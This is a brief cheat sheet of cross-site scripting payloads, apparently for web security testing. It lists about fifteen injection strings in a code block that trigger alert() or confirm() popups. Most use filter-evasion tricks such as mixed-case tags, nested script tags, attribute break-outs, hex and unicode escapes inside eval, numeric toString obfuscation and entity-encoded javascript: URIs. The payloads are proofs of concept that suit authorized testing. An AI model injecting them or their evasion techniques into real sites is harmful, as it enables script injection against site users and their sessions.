Cheatsheet xss payloads.
```
<svg/onload=alert()>
<script>alert()</script>
<ScRipT>alert();</ScRipT>
<IMG SRC=jAVasCrIPt:alert()>
<ScRiPt>alert(1)</sCriPt>
‘; alert(1);
‘)alert(1);//
<script>alert('XSS')</script>
<scr<script>ipt>alert('XSS')</scr<script>ipt>
"><script>alert('XSS')</script>
"><script>alert(String.fromCharCode(88,83,83))</script>
<script>\u0061lert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
<script>eval(8680439..toString(30))(983801..toString(36))</script> //parseInt("confirm",30) == 8680439 && 8680439..toString(30) == "confirm"
<object/data="jav&#x61;sc&#x72;ipt&#x3a;al&#x65;rt&#x28;23&#x29;">
```
